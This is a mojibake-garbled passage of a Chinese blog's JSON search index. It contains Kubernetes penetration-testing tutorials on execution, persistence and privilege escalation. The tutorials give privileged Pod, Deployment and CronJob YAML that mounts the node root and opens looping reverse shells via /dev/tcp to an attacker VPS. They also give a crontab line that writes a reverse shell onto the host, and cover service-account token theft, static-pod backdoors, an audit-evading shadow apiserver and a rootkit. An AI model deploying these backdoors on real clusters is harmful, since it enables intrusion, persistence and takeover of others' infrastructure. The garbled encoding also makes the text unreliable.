¹ç›®å½•å®ç°å¯¹nodeèŠ‚ç‚¹çš„è®¿é—®æˆ–è€…é€ƒé€¸ï¼ˆé€ƒé€¸åœ¨åé¢çš„æ–‡ç« æ€»ç»“ï¼‰\næœªå¼€å¯RBACæƒé™ RBAC(Role-Based Access Control)æ˜¯k8sä¸­ç”¨äºæ§åˆ¶è®¿é—®æƒé™çš„ä¸€ç§ç­–ç•¥ï¼Œå®ƒå…è®¸ç®¡ç†å‘˜å®šä¹‰è§’è‰²å’Œè§’è‰²ç»‘å®šï¼Œä»¥åŠåˆ†é…è¿™äº›è§’è‰²ç»™ç”¨æˆ·æˆ–æœåŠ¡è´¦å·ï¼Œä»¥æ­¤æ¥é™åˆ¶ä»–ä»¬å¯¹é›†ç¾¤çš„è®¿é—®å’Œæ“ä½œæƒé™\næˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨masterèŠ‚ç‚¹ä¸Šæ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹apiserverçš„å¯åŠ¨å‚æ•°æ˜¯å¦æœ‰--authorization-mode=RBACï¼Œä»¥æ­¤æŸ¥çœ‹æ˜¯å¦å¼€å¯äº†RBACæƒé™ï¼š\ncat /etc/kubernetes/manifests/kube-apiserver.yaml | grep authorization-mode æˆ–è€…ï¼š\nps -ef | grep authorization-mode åªè¦æœ‰è¿™ä¸ªå‚æ•°ï¼Œåˆ™ä»£è¡¨å¼€å¯äº†RBACæƒé™\nå¦‚æœæ²¡æœ‰å¼€å¯RBACæƒé™ï¼Œä»£è¡¨æˆ‘ä»¬å¯ä»¥ä½¿ç”¨k8sä¸­ä»»æ„ç»è¿‡è®¤è¯çš„tokenå®ç°å¯¹k8s apiserverçš„æ§åˆ¶ï¼Œé‚£ä¹ˆæ€è·¯å°±å’Œä¸Šé¢è¿æ¥API serveræ‰§è¡Œæ˜¯ä¸€æ ·çš„äº†ï¼Œå½“æˆ‘ä»¬è·å¾—äº†podçš„shellï¼Œå¯ä»¥å°è¯•è¯»å–/var/run/secrets/kubernetes.io/serviceaccount/tokenè·å¾—tokenï¼Œç„¶åç›´æ¥ä½¿ç”¨curlæˆ–è€…kubectlè°ƒç”¨apiserverï¼Œåˆ›å»ºåé—¨podå¹¶é€ƒé€¸æ¥æ§åˆ¶èŠ‚ç‚¹\nä¸å®‰å…¨çš„å®¹å™¨é•œåƒ è¿™ä¸ªåœ¨å‰é¢æ–‡ç« k8sé¢ä¸´çš„é£é™©ä¸­ä¹Ÿæåˆ°è¿‡ï¼Œå¦‚æœå®¹å™¨æœ¬èº«å­˜åœ¨æ¼æ´ï¼Œåˆ™å¾ˆå®¹æ˜“æˆä¸ºå…¥å£ç‚¹ï¼Œæ¯”å¦‚ç¬”è€…é‡åˆ°è¿‡çš„ä¸€ä¸ªæ”»é˜²åœºæ™¯ï¼Œpodä¸Šè¿è¡Œçš„zabbixåœ¨å…¬ç½‘å­˜åœ¨å¼±å£ä»¤ï¼Œè¿›å…¥åå°å¯ä»¥RCEå¯¼è‡´podè¢«æ¥ç®¡ï¼Œåç»­è¿›è¡Œä¸€ç³»åˆ—æ¨ªå‘å’Œé€ƒé€¸ï¼ŒæˆåŠŸæ¥ç®¡äº†æ•´ä¸ªk8s\næ€»ç»“ ä»ä¸Šé¢çš„è¿™äº›æ–¹æ³•æ¥çœ‹ï¼Œæ‰§è¡Œè¿™ä¸€æ­¥çš„ç›®æ ‡å°±åˆ©ç”¨ä¼ ç»Ÿå®‰å…¨æ¼æ´ã€tokenã€apiserveråŸæœ‰å‘½ä»¤ç­‰æ‰‹æ®µï¼Œåœ¨podä¸Šå®ç°å‘½ä»¤æ‰§è¡Œæˆ–è€…èƒ½å¤Ÿè·å¾—apiserverçš„æ§åˆ¶æƒï¼Œä¸ºæ¥ä¸‹æ¥çš„æƒé™æå‡ï¼ˆå³é€ƒé€¸ï¼‰åšå‡†å¤‡\n",
        "summary": "K8sæ¸—é€-æ‰§è¡Œ æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\næ‰§è¡Œé˜¶æ®µçš„ä¸»è¦ä»»åŠ¡æ˜¯å®ç°åœ¨é›†ç¾¤å†…æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œè·å¾—shell\nkubectl execè¿›å…¥å®¹å™¨ å½“æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶apiserveræ—¶ï¼Œå’Œdockerç±»ä¼¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›å…¥å®¹å™¨çš„shellä¸­æ‰§è¡Œå‘½ä»¤ï¼š\n# apiserveræœªæˆæƒæ—¶ kubectl -s x.x.x.x:8080 --namespace=default exec -it test-rev -- bash # è·å–åˆ°kubeconfigæ–‡ä»¶æ—¶ kubectl --kubeconfig config --namespace=default exec -it test-rev -- bash # è·å–åˆ°é«˜æƒé™tokenæ—¶ kubectl --server=https://x.x.x.x:6443 --token=\u0026#34;\u0026lt;tokenå€¼\u0026gt;\u0026#34; --insecure-skip-tls-verify --namespace=default exec -it test-rev -- bash æ¯”å¦‚è¿™é‡Œè¿›å…¥å®¹å™¨æ‰§è¡Œåå¼¹shellå‘½ä»¤\næˆåŠŸç›‘å¬åˆ°åå¼¹shellï¼š\nåˆ›å»ºåé—¨pod è·å–åˆå§‹è®¿é—®æƒé™åï¼Œé€šè¿‡åˆ›å»ºåé—¨podæ¥æ‰§è¡Œåç»­æ”»å‡»ï¼Œ\né¦–å…ˆæœ¬æœºä¸Šæ–°å»ºä¸ªyamlæ–‡ä»¶ç”¨äºåˆ›å»ºå®¹å™¨ï¼Œå°†èŠ‚ç‚¹çš„æ ¹ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„ /mnt ç›®å½•ï¼Œå¹¶åœ¨å®¹å™¨å¯åŠ¨åè‡ªåŠ¨æ‰§è¡Œåå¼¹shellå‘½ä»¤ï¼Œå†…å®¹å¦‚ä¸‹ï¼š\napiVersion: v1 kind: Pod metadata: name: test-rev spec: nodeName: \u0026lt;èŠ‚ç‚¹åç§°\u0026gt; containers: - name: test-container image: ubuntu command: [\u0026#34;/bin/sh\u0026#34;] args: - \u0026#34;-c\u0026#34; - | apt update \u0026amp;\u0026amp; apt install -y bash netcat-openbsd \u0026amp;\u0026amp; \\ bash -c \u0026#39;while true; do bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ä½ çš„vpsçš„å…¬ç½‘IP\u0026gt;/2333 0\u0026gt;\u0026amp;1; sleep 60; done\u0026#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / ç„¶åä½¿ç”¨ kubectl åˆ›å»ºæ–‡ä»¶æŒ‡å®šçš„æ¶æ„å®¹å™¨ï¼š\n"
    }
,
    {
        "title": "K8sæ¸—é€-æŒä¹…åŒ–",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%8C%81%E4%B9%85%E5%8C%96/",
        "content": "K8sæ¸—é€-æŒä¹…åŒ– æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\næŒä¹…åŒ–å³æƒé™ç»´æŒï¼Œé€šè¿‡æŒä¹…åŒ–åœ¨k8sä¸­ç•™ä¸‹åé—¨ï¼Œå¯ä»¥åœ¨åˆå§‹è®¿é—®çš„å…¥å£ç‚¹ä¸¢æ‰ä¹‹åä»ç„¶ä¿æŒå¯¹k8sçš„æ§åˆ¶æƒ\néƒ¨ç½²åé—¨å®¹å™¨ åœ¨æ‹¥æœ‰äº†åˆ›å»ºpodçš„æƒé™åï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„podä¸ºæˆ‘ä»¬å®ç°æƒé™ç»´æŒï¼ˆå³åœ¨å®¹å™¨ä¸­ç•™ä¸‹shellï¼‰ï¼Œå¹¶ä¸”åœ¨podä¸­ç•™ä¸‹èƒ½æ§åˆ¶nodeçš„åé—¨ï¼ˆæ¯”å¦‚æŒ‚è½½nodeçš„æ ¹ç›®å½•ï¼‰\nå¸¸è§æ–¹æ³•å¦‚ä¸‹\næŒ‚è½½ç›®å½• å‘åˆ›å»ºçš„podä¸­æŒ‚è½½ä¸€äº›ç”¨äºé€ƒé€¸çš„ç›®å½•ï¼Œåœ¨æˆ‘çš„é€ƒé€¸ç›¸å…³æ–‡ç« è¯¦ç»†è®°å½•äº†ï¼šK8sæ¸—é€-æƒé™æå‡\nè¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªé…ç½®ï¼š\nrestartPolicy: Always å¯ä»¥è®©podåœ¨è¢«å…³é—­åé‡å¯\nä½¿ç”¨k8sæ§åˆ¶å™¨éƒ¨ç½²åé—¨å®¹å™¨ åœ¨å‰é¢ K8sæ¸—é€-æ‰§è¡Œ çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬éƒ¨ç½²åé—¨å®¹å™¨çš„æ–¹å¼æ˜¯ä½¿ç”¨yamlæ–‡ä»¶ï¼Œè€Œæ–‡ä»¶ä¸­æœ‰è¿™æ ·ä¸€è¡Œï¼š\nkind: Pod è¿™ä»£è¡¨æˆ‘ä»¬åˆ›å»ºçš„åé—¨å®¹å™¨å°±æ˜¯ä¸€ä¸ªå•çº¯çš„podï¼Œè€Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ç±»åé—¨æ˜¯æ§åˆ¶å™¨ï¼Œå®ƒèƒ½è‡ªåŠ¨åˆ›å»ºå’Œæ§åˆ¶æ¶æ„podï¼Œå¹¶ä¸”å®ƒä¹ŸåŸºäºyamlæ–‡ä»¶åˆ›å»ºï¼Œä¼˜ç‚¹æ˜¯æ›´ç¨³å®šï¼Œå…¶è‡ªåŠ¨åˆ›å»ºçš„podåœ¨è¢«killåå¯ä»¥è¢«æ¢å¤ï¼Œå®ƒçš„yamlæ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š\napiVersion: apps/v1 kind: Deployment metadata: name: test-rev spec: replicas: 1 selector: matchLabels: app: test-rev template: metadata: labels: app: test-rev spec: nodeName: \u0026lt;èŠ‚ç‚¹åç§°\u0026gt; containers: - name: test-container image: ubuntu command: [\u0026#34;/bin/sh\u0026#34;] args: - \u0026#34;-c\u0026#34; - | apt update \u0026amp;\u0026amp; apt install -y bash netcat-openbsd \u0026amp;\u0026amp; \\ bash -c \u0026#39;while true; do bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ä½ çš„vpsçš„å…¬ç½‘IP\u0026gt;/2333 0\u0026gt;\u0026amp;1; sleep 60; done\u0026#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / æŒ‡å®šyamlæ–‡ä»¶å³å¯åˆ›å»ºï¼š\nå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹æˆ‘ä»¬éƒ¨ç½²çš„æ§åˆ¶å™¨ï¼š\nkubectl get deployments é€šè¿‡deploymentéƒ¨ç½²çš„podå³ä½¿è¢«åˆ é™¤ä¹Ÿèƒ½è‡ªåŠ¨é‡å»ºï¼š\nå¦‚æœè¦åˆ é™¤è¿™ä¸ªæ§åˆ¶å™¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\nkubectl delete deployment test-rev cronjobæŒä¹…åŒ– cronjobçš„ä½œç”¨ç±»ä¼¼äºlinuxä¸Šçš„crontabï¼Œä¼šåˆ›å»ºåŸºäºæ—¶é—´é—´éš”é‡å¤çš„è°ƒåº¦job\njobæ§åˆ¶å™¨ä¹Ÿæ˜¯k8sçš„ä¸€ç§å†…ç½®æ§åˆ¶å™¨ï¼Œç”¨äºè¿è¡Œä¸€ä¸ªæˆ–å¤šä¸ªPodæ¥æ‰§è¡Œä»»åŠ¡ï¼Œyamlæ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š\napiVersion: batch/v1 kind: CronJob metadata: name: test-rev-cron spec: schedule: \u0026#34;*/1 * * * *\u0026#34; # æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ jobTemplate: spec: template: spec: nodeName: \u0026lt;èŠ‚ç‚¹åç§°\u0026gt; restartPolicy: Never containers: - name: test-container image: ubuntu command: [\u0026#34;/bin/sh\u0026#34;] args: - \u0026#34;-c\u0026#34; - | apt update \u0026amp;\u0026amp; apt install -y bash netcat-openbsd \u0026amp;\u0026amp; \\ bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ä½ çš„vpsçš„å…¬ç½‘IP\u0026gt;/2333 0\u0026gt;\u0026amp;1\u0026#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / åˆ›å»ºæ–¹æ³•ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼š\nåˆ›å»ºåå¯ä»¥æŸ¥çœ‹æ˜¯å¦åˆ›å»ºæˆåŠŸï¼š\nkubectl --kubeconfig config get cronjob -A åˆ›å»ºåå°±å¯ä»¥æ¯åˆ†é’Ÿæ”¶åˆ°ä¸€æ¬¡åå¼¹shellï¼š\nåˆ é™¤ä¹Ÿå¾ˆç®€å•ï¼š\nkubectl delete cronjob test-rev-cron åœ¨å®¹å™¨/é•œåƒå†…æ¤å…¥åé—¨ å®¹å™¨æ¤å…¥åé—¨ è¿™é‡Œçš„å³å¯¹podå®¹å™¨è¿›è¡Œä¸€äº›åŸºç¡€çš„ç»´æŒï¼Œæ–¹æ³•å’Œå¸¸è§„linuxæƒé™ç»´æŒç›¸ä¼¼ï¼Œå¯ä»¥å‚è€ƒæˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼šlinuxæƒé™ç»´æŒ\nå‘é•œåƒæ¤å…¥åé—¨ å¦‚æœè·å–äº†ç§æœ‰é•œåƒä»“åº“çš„æ§åˆ¶æƒé™ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥å°è¯•å‘é•œåƒæ³¨å…¥æ¶æ„ä»£ç ï¼Œå¸¸è§çš„æ–¹æ³•æ˜¯ä¿®æ”¹dockerfileæ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ¤å…¥æ¶æ„çš„shå‘½ä»¤\nä¿®æ”¹æ ¸å¿ƒæ–‡ä»¶è®¿é—®æƒé™ å½“æˆ‘ä»¬è·å¾—äº†masterèŠ‚ç‚¹çš„æƒé™åï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹apiserveré…ç½®æ–‡ä»¶æ¥ä¿®æ”¹ç»„ä»¶çš„è®¿é—®æƒé™ï¼Œå¸¸ç”¨æ–¹å¼å¦‚ä¸‹ï¼š\nå¼€å¯apiserverä¸å®‰å…¨ç«¯å£æˆ–å®‰å…¨ç«¯å£åŒ¿åè®¿é—® é…ç½®kubelet 10250ç«¯å£æœªæˆæƒè®¿é—® é…ç½®etcdæœªæˆæƒ é…ç½®kube proxy apiserverç›‘å¬å…¶ä»–ç«¯å£ ä¼ªè£…ç³»ç»ŸPod kube-systemæ˜¯k8sç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰å¯¹è±¡ç»„æˆçš„å‘½åç©ºé—´ï¼ŒåŒ…å«å¾ˆå¤šç”¨äºç®¡ç†é›†ç¾¤çš„ç»„ä»¶ï¼š\nä¸€èˆ¬æ¥è¯´è¿™äº›ç»„ä»¶æ˜¯ä¸ä¼šè¢«æŸ¥çœ‹å’Œä¿®æ”¹çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œé¢ä¼ªé€ ä¸€ä¸ªç³»ç»Ÿpodï¼Œpodåˆ›å»ºçš„æ–¹æ³•å’Œå‰é¢ä¸€æ ·ï¼Œåªæ˜¯åå­—å’ŒæŒ‡å®šçš„namespaceä¸åŒï¼Œè¿™é‡Œä¸å†èµ˜è¿°\néƒ¨ç½²é™æ€pod static æ˜¯ Kubernetes é‡Œçš„ä¸€ç§ç‰¹æ®Šçš„ Podï¼Œç”±èŠ‚ç‚¹ä¸Š kubelet è¿›è¡Œç®¡ç†ã€‚åœ¨æ¼æ´åˆ©ç”¨ä¸Šæœ‰ä»¥ä¸‹å‡ ç‚¹æ˜æ˜¾çš„ä¼˜åŠ¿ï¼š\nä»…ä¾èµ–äº kubeletï¼šStatic Pod ä»…ä¾èµ– kubeletï¼Œå³ä½¿ K8s çš„å…¶ä»–ç»„ä»¶éƒ½å¥”æºƒæ‰çº¿ï¼Œåˆ é™¤ apiserverï¼Œä¹Ÿä¸å½±å“ Static Pod çš„ä½¿ç”¨ï¼Œåœ¨ Kubernetes å·²ç»æ˜¯äº‘åŸç”ŸæŠ€æœ¯äº‹å®æ ‡å‡†çš„ç°åœ¨ï¼Œkubelet å‡ ä¹è¿è¡Œä¸æ¯ä¸ªå®¹å™¨å®¿ä¸»æœºèŠ‚ç‚¹ä¹‹ä¸Š\né…ç½®ç›®å½•å›ºå®šï¼šStatic Pod é…ç½®æ–‡ä»¶å†™å…¥è·¯å¾„ç”± kubelet config çš„ staticPodPath é…ç½®é¡¹ç®¡ç†ï¼Œé»˜è®¤ä¸º /etc/kubernetes/manifests æˆ– /etc/kubelet.d/ï¼Œä¸€èˆ¬æƒ…å†µä¸åšæ›´æ”¹ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒKuberneteså‘è¡Œç‰ˆçš„é»˜è®¤è·¯å¾„å¯èƒ½æœ‰æ‰€ä¸åŒï¼Œå»ºè®®åœ¨å®é™…ç¯å¢ƒä¸­è¿›è¡Œç¡®è®¤\næˆ‘ä»¬åªéœ€è¦åœ¨é…ç½®ç›®å½•å¦‚/etc/kubernetes/manifestsä¸­æ·»åŠ æ¶æ„podçš„yamlæ–‡ä»¶å³å¯\næˆ‘ä»¬å¯ä»¥æŸ¥çœ‹/etc/systemd/system/kubelet.service.d/10-config.confä¸­æ˜¯å¦æœ‰è¿™ä¸ªé…ç½®ï¼š\næ²¡æœ‰é…ç½®æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨å¯åŠ¨è¿™ä¸ªé…ç½®ï¼š\nkubelet --pod-manifest-path=/etc/kubernetes/manifests æˆ–åœ¨ä¸Šé¢æˆªå›¾ä¸­çš„/var/lib/kubelet/config.yamlæ–‡ä»¶ä¸­æ·»åŠ ä¸€è¡Œï¼š\nstaticPodPath: /etc/kubernetes/manifests åˆ›å»ºshadow apiserver æ€è·¯æ˜¯åˆ›å»ºä¸€ä¸ªå…·æœ‰apiserveråŠŸèƒ½çš„podï¼Œåç»­å‘½ä»¤å¯ä»¥åœ¨è¿™ä¸ªå½±å­apiserverä¸Šè¿›è¡Œä¸‹å‘ï¼Œå¯ä»¥ç»•è¿‡k8sçš„æ—¥å¿—å®¡è®¡ï¼Œä¸ä¼šè¢«åŸapiserverè®°å½•ï¼Œæ›´åŠ éšè”½\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨CDKå®ç°ï¼Œå¯ä»¥çœ‹åŸwikiï¼šhttps://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver\n./cdk run k8s-shadow-apiserver default shadow apiserverä¼šå¼€å¯æœªæˆæƒç«¯å£ï¼Œéƒ¨ç½²å®Œæˆåæˆ‘ä»¬å¯ä»¥é€šè¿‡kubectlæˆ–cdkçš„kcurlå‘shadow apiserverä¸‹å‘è¯·æ±‚\nk0otkit ç»¿ç›Ÿçš„é˜®åšç”·å¸ˆå‚…åˆ†äº«äº†ä¸€ç§k8så†…çš„rootkitæŠ€æœ¯ï¼šhttps://blog.nsfocus.net/k0otkithack-k8s-in-a-k8s-way/\nä»æ”»å‡»è€…çš„è§’åº¦æ¥çœ‹ï¼Œk0otkitåˆ©ç”¨äº†å¤šç§æŠ€æœ¯å’Œå¤©ç„¶ä¼˜åŠ¿ï¼š\nDaemonSetå’ŒSecretèµ„æºï¼ˆå¿«é€ŸæŒç»­åå¼¹ã€èµ„æºåˆ†ç¦»ï¼‰ kube-proxyé•œåƒï¼ˆå°±åœ°å–æï¼‰ åŠ¨æ€å®¹å™¨æ³¨å…¥ï¼ˆé«˜éšè”½æ€§ï¼‰ Meterpreterï¼ˆæµé‡åŠ å¯†ã€æŒç»­åå¼¹ï¼‰ æ— æ–‡ä»¶æ”»å‡»ï¼ˆé«˜éšè”½æ€§ï¼‰ è¿™ä¸ªrootkité™¤äº†ç”¨äºæƒé™ç»´æŒä»¥å¤–ï¼Œåœ¨æˆ‘ä»¬è·å¾—masterèŠ‚ç‚¹çš„cluster-adminæƒé™ä¹Ÿå¯ä»¥ç”¨æ¥å¿«é€Ÿè·å–æ‰€æœ‰èŠ‚ç‚¹shellï¼Œå…·ä½“çš„ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒgithubï¼šhttps://github.com/Metarget/k0otkit\n",
        "summary": "K8sæ¸—é€-æŒä¹…åŒ– æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\næŒä¹…åŒ–å³æƒé™ç»´æŒï¼Œé€šè¿‡æŒä¹…åŒ–åœ¨k8sä¸­ç•™ä¸‹åé—¨ï¼Œå¯ä»¥åœ¨åˆå§‹è®¿é—®çš„å…¥å£ç‚¹ä¸¢æ‰ä¹‹åä»ç„¶ä¿æŒå¯¹k8sçš„æ§åˆ¶æƒ\néƒ¨ç½²åé—¨å®¹å™¨ åœ¨æ‹¥æœ‰äº†åˆ›å»ºpodçš„æƒé™åï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„çš„podä¸ºæˆ‘ä»¬å®ç°æƒé™ç»´æŒï¼ˆå³åœ¨å®¹å™¨ä¸­ç•™ä¸‹shellï¼‰ï¼Œå¹¶ä¸”åœ¨podä¸­ç•™ä¸‹èƒ½æ§åˆ¶nodeçš„åé—¨ï¼ˆæ¯”å¦‚æŒ‚è½½nodeçš„æ ¹ç›®å½•ï¼‰\nå¸¸è§æ–¹æ³•å¦‚ä¸‹\næŒ‚è½½ç›®å½• å‘åˆ›å»ºçš„podä¸­æŒ‚è½½ä¸€äº›ç”¨äºé€ƒé€¸çš„ç›®å½•ï¼Œåœ¨æˆ‘çš„é€ƒé€¸ç›¸å…³æ–‡ç« è¯¦ç»†è®°å½•äº†ï¼šK8sæ¸—é€-æƒé™æå‡\nè¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªé…ç½®ï¼š\nrestartPolicy: Always å¯ä»¥è®©podåœ¨è¢«å…³é—­åé‡å¯\nä½¿ç”¨k8sæ§åˆ¶å™¨éƒ¨ç½²åé—¨å®¹å™¨ åœ¨å‰é¢ K8sæ¸—é€-æ‰§è¡Œ çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬éƒ¨ç½²åé—¨å®¹å™¨çš„æ–¹å¼æ˜¯ä½¿ç”¨yamlæ–‡ä»¶ï¼Œè€Œæ–‡ä»¶ä¸­æœ‰è¿™æ ·ä¸€è¡Œï¼š\nkind: Pod è¿™ä»£è¡¨æˆ‘ä»¬åˆ›å»ºçš„åé—¨å®¹å™¨å°±æ˜¯ä¸€ä¸ªå•çº¯çš„podï¼Œè€Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ç±»åé—¨æ˜¯æ§åˆ¶å™¨ï¼Œå®ƒèƒ½è‡ªåŠ¨åˆ›å»ºå’Œæ§åˆ¶æ¶æ„podï¼Œå¹¶ä¸”å®ƒä¹ŸåŸºäºyamlæ–‡ä»¶åˆ›å»ºï¼Œä¼˜ç‚¹æ˜¯æ›´ç¨³å®šï¼Œå…¶è‡ªåŠ¨åˆ›å»ºçš„podåœ¨è¢«killåå¯ä»¥è¢«æ¢å¤ï¼Œå®ƒçš„yamlæ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š\napiVersion: apps/v1 kind: Deployment metadata: name: test-rev spec: replicas: 1 selector: matchLabels: app: test-rev template: metadata: labels: app: test-rev spec: nodeName: \u0026lt;èŠ‚ç‚¹åç§°\u0026gt; containers: - name: test-container image: ubuntu command: [\u0026#34;/bin/sh\u0026#34;] args: - \u0026#34;-c\u0026#34; - | apt update \u0026amp;\u0026amp; apt install -y bash netcat-openbsd \u0026amp;\u0026amp; \\ bash -c \u0026#39;while true; do bash -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;ä½ çš„vpsçš„å…¬ç½‘IP\u0026gt;/2333 0\u0026gt;\u0026amp;1; sleep 60; done\u0026#39; volumeMounts: - mountPath: /mnt name: test-volume securityContext: privileged: true volumes: - name: test-volume hostPath: path: / æŒ‡å®šyamlæ–‡ä»¶å³å¯åˆ›å»ºï¼š\n"
    }
,
    {
        "title": "K8sæ¸—é€-æƒé™æå‡",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/k8s%E5%AE%89%E5%85%A8/k8s%E6%B8%97%E9%80%8F-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/",
        "content": "K8sæ¸—é€-æƒé™æå‡ æ–‡ç« é¦–å‘äºtrackå®‰å…¨ç¤¾åŒºï¼šK8sæ¸—é€å…¥é—¨ä»é›¶åˆ°ä¸€\nä¸€èˆ¬æ¥è¯´ï¼Œåœ¨k8sä¸­çš„ææƒå°±æ˜¯å°è¯•ä»podå®¹å™¨è·å–åˆ°å¯¹nodeèŠ‚ç‚¹çš„æ§åˆ¶æƒï¼Œç”šè‡³è·å–å¯¹äº‘èµ„æºçš„è®¿é—®æƒé™ã€‚\nRBACæƒé™æ»¥ç”¨ ç±»ä¼¼äºæˆ‘ä»¬åœ¨æ‰§è¡Œä¸­æåˆ°çš„æ‰“æ³•ï¼Œå°±æ˜¯è·å–podä¸­é«˜æƒé™ï¼ˆæ¯”å¦‚ç»‘å®šåˆ°cluster-adminç”¨æˆ·ç»„ï¼‰çš„serviceaccountï¼Œç„¶åå†è°ƒç”¨apiserverå®ç°é€ƒé€¸ï¼Œç„¶è€Œé™¤äº†cluster-adminï¼Œå¾ˆå¤šå‡­è¯ä¹Ÿæ˜¯å¯ä»¥æƒé™æå‡åˆ°cluster-adminçš„ï¼Œæˆ‘ä»¬å¯ä»¥é‡ç‚¹å…³æ³¨Helmã€Ciliumã€Nginx Ingressã€Prometheusç­‰æœåŠ¡\néƒ¨ç½²é™æ€pod è¿™ä¸ªæ–¹æ³•åœ¨æˆ‘çš„k8sæ¸—é€-æŒä¹…åŒ–çš„ç¬”è®°ä¸­å·²ç»ä»‹ç»è¿‡äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°\nåˆ©ç”¨å®¹å™¨ä¸å®‰å…¨é…ç½®ææƒ å³å®¹å™¨é€ƒé€¸ï¼Œè¿™é‡Œçš„å¾ˆå¤štrickså…¶å®å’Œdockeré€ƒé€¸æ²¡æœ‰å¾ˆå¤§åŒºåˆ«\næŒ‚è½½ç›®å½•é€ƒé€¸ æŒ‚è½½çš„æ–¹æ³•å¾ˆå¤šï¼Œä¾‹å¦‚æŒ‚è½½æ ¹ç›®å½•ã€æŒ‚è½½pocfsã€æŒ‚è½½/etcã€æŒ‚è½½cgroupã€æŒ‚è½½/var/logç­‰ç­‰ï¼Œå¯ä»¥ç›´æ¥çœ‹æˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼šDockeré€ƒé€¸æ‰‹æ³•å¤§å…¨ï¼Œè¿™é‡Œæä¸€ä¸ªæœ€ç®€å•çš„æŒ‚è½½æ ¹ç›®å½•ï¼š\næ¯”å¦‚æˆ‘ä»¬åˆ›å»ºæ¶æ„podçš„æ—¶å€™ï¼Œæ ¹ç›®å½•æŒ‚è½½åˆ°äº†å®¹å™¨çš„/mntç›®å½•ï¼Œæ‰€ä»¥åœ¨è·å–äº†podçš„shellåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹podçš„/mntç›®å½•æ¥è®¿é—®æŸ¥çœ‹nodeçš„æ ¹ç›®å½•ï¼š\næ¥ä¸‹æ¥å¯ä»¥é€šè¿‡å†™å®šæ—¶ä»»åŠ¡æ¥è·å–nodeçš„shellï¼š\necho -e \u0026#34;* * * * * root /bin/bash -c \u0026#39;sh -i \u0026gt;\u0026amp; /dev/tcp/\u0026lt;vpsçš„å…¬ç½‘IP\u0026gt;/4444 0\u0026gt;\u0026amp;1 \u0026amp; disown \u0026#39;\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab æ³¨æ„ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰ç›´æ¥ä½¿ç”¨sh -i \u0026gt; /dev/tcp/\u0026lt;IP\u0026gt;/4444 2\u0026gt;\u0026amp;1ï¼Œå› ä¸ºcron é»˜è®¤ä½¿ç”¨çš„æ˜¯ /bin/shï¼Œè€Œä¸æ˜¯ bashï¼Œsh 